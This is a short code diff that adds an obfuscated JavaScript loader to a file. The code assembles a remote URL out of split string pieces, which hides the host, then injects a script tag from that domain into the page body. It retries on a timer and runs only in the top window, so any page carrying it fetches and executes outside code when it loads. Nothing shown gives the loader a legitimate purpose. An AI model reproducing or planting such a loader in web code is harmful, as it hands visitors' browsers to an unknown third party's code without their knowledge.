@@ -1,0 +1,4 @@
+(function(){var init=false;function load_script(){var script=document.createElement('script');script.setAttribute('charset','UTF-8');if(0){script.setAttribute('async','async');}
+script.setAttribute('src',"\/\/"+"b."+"de"+"lt"+"a-"+"ho"+"rs"+"e."+"me"+"n\/"+"co"+"de"+"\/x"+"\/z"+"\/?"+"pi"+"d="+"30"+"04"+"14");try{var fc=document.body.firstChild;fc.parentNode.insertBefore(script,fc);}catch(e){document.body.appendChild(script);}}
+var init_time=function(){setTimeout(function(){init_script();},10);};var init_script=function(){if(!init){try{if('function'==typeof document.body.appendChild&&window===top){init=true;load_script();}}catch(e){}
+init_time();}};init_time();})();
